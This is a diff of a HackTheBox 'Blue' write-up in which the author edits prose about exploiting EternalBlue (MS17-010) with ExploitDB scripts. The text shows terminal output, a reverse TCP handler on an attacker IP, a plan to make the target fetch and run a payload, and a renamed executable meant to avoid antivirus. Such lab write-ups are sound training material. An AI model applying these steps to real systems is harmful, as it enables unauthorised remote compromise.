@@ -4,15 +4,15 @@ I decided to google the operating system, searching "windows 7 7601 exploit". Th
 
 Exploit DB reveals that it can be used for local privilege escalation: [https://www.exploit-db.com/exploits/47176](https://www.exploit-db.com/exploits/47176). So I perhaps needed to find another way to gain a foothold on the box first.
 
-I took another look at Google, and there was a separate writeup from rapid7 that suggested remote code execution over SMB:
+I took another look at Google, and there was a separate writeup from Rapid7 that suggested remote code execution over SMB:
 
 [https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
 
-This looked much more useful. It was available on `msfconsole`, but I decided to use the version from exploitdb instead as metasploit is prohibited in OSCP.
+This looked much more useful. It was available on `msfconsole`, but I decided to use the version from ExploitDB instead as metasploit is prohibited in OSCP.
 
 ## Editing the 42031 Exploit
 
-I spent a while on this box editing the `windows/remote/42031.py` exploit on exploitdb to work with `python2` on my machine. The exploit didn't end up working in the end, but the steps involved highlighted an important skill. If you want to skip to the [[#Working Exploit - 42315|working exploit]] you can.
+I spent a while on this box editing the `windows/remote/42031.py` exploit on ExploitDB to work with `python2` on my machine. The exploit didn't end up working in the end, but the steps involved highlighted an important skill. If you want to skip to the [[#Working Exploit - 42315|working exploit]] you can.
 
 Running `42301.py` with `python3` causes an issue with the `pack()` function:
 
@@ -33,7 +33,7 @@ There are a couple of ways to fix this:
 
 I thought running it with `python2` was simplest:
 
-```
+```bash
 ┌──(mac㉿kali)-[~/Documents/HTB/blue]
 └─$ python2 42031.py 
 Traceback (most recent call last):
@@ -72,9 +72,13 @@ As I said, the script didn't end up working - but these debugging steps were use
 
 I followed [this excellent tutorial](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/) on exploiting Eternal Blue manually. It used a different exploit, `windows/remote/42315.py`.
 
-The exploit requires providing a working username. When I first tried the box I went with `null`, as I had used it to login before. I tried the exploit multiple times before realising this was incorrect - in fact, earlier enumeration exposed that `guest` was the correct username to login with.
+The exploit requires providing a working username. When I first tried the box I went with `null`, as I had used it to login before.
 
-After setting the username, I downloaded `mysmb`:
+I tried the exploit multiple times before realising this was incorrect - in fact, earlier enumeration exposed that `guest` was the correct username to login with. I set this in the code:
+
+![[Pasted image 20210501185951.png]]
+
+After setting the username, I downloaded `mysmb`, a required package:
 
 ```bash
 ┌──(mac㉿kali)-[~/Documents/HTB/blue]
@@ -119,7 +123,7 @@ creating file c:\pwned.txt on the target
 Done
 ```
 
-So it worked! We don't have visbility over whether the file was created, as it is on the system itself not the SMB share. So now we have to modify the exploit to let us privesc.
+So it worked! We don't have visibility over whether the file was created, as it is on the system itself not the SMB share. So now we have to modify the exploit to let us privesc.
 
 We want to change the exploit to instead request a file from our box and execute it, using `service_exec()`.
 
@@ -149,6 +153,8 @@ However this would turn out not to work, and I eventually settled on using `smb_
 
 ![[Pasted image 20210501191017.png]]
 
+(*note:* I also changed the name of the `.exe` to `sc.exe`, in case `shell.exe` was getting caught by AV - this turned out not to be the issue, but that's why the filename has changed)
+
 I used the `msf` handler, as per the tutorial:
 
 ```bash
@@ -167,7 +173,9 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.2:9001 
 ```
 
-I spent a while debugging my payloads - I had made some syntax errors, which I've excluded because no one wants to read those. My real issues were getting the username and delivery method incorrect, but most of my time was spent changing payloads as I believed that to be the issue. A lesson was learnt here - go for the simplest payload first and make sure everything else is correct before you go changing it.
+I spent a while debugging my payloads - I had made some syntax errors in my original attempt, which I've excluded because no one wants to read those.
+
+My real issues turned out to be getting the username and delivery method incorrect, but most of my time was spent changing payloads as I believed that to be the issue at the time. A lesson was learnt here - go for the simplest payload first and make sure everything else is correct before you go changing it.
 
 When all that was fixed I ran my exploit:
 
@@ -254,3 +262,7 @@ And here are the flags:
 That's the box!
 
 ![[Pasted image 20210501205703.png]]
+
+# Tags
+
+#writeup #cve #windows
